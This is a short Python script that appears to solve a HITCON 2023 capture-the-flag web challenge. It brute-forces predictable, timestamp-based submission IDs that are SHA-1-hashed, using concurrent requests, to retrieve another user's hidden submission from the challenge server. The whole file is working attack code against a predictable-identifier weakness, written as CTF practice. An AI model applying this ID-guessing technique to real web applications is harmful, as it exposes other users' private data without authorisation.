from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import requests as r
from datetime import datetime, timezone
from hashlib import sha1

def fetch_timestamp():
    res = r.get(f"{host}/submission.php?homeworkid=1")
    return re.findall("<td>(\d{4}-\d\d-\d\d \d\d:\d\d:\d\d.\d{6})</td>", res.text)[0]

def check(s, u):
    submission_id = f"{username}_{s:08x}{u:05x}"
    submission_hash = sha1(submission_id.encode()).hexdigest()

    res = r.get(f"{host}/submission.php?hash={submission_hash}")

    return "Submission not found" not in res.text, (s, u), res.text

host = "http://rectf.hitcon2023.online:30203/"

timestamp = fetch_timestamp()
username = "flagholder"
sec, usec = map(int, str(datetime.fromisoformat(timestamp).replace(tzinfo=timezone.utc).timestamp()).split("."))

offset = 1000

print(timestamp)

with ThreadPoolExecutor(10) as executor:
    futures = []

    for v in range(usec, usec-offset, -1):
        futures.append(executor.submit(check, sec, v))

    for future in as_completed(futures):
        result = future.result()

        if result[0]:
            s, u = result[1]
            print(datetime.utcfromtimestamp(float(f"{s}.{u}")))
            print(re.findall("<pre>(.*)</pre>", result[2])[0])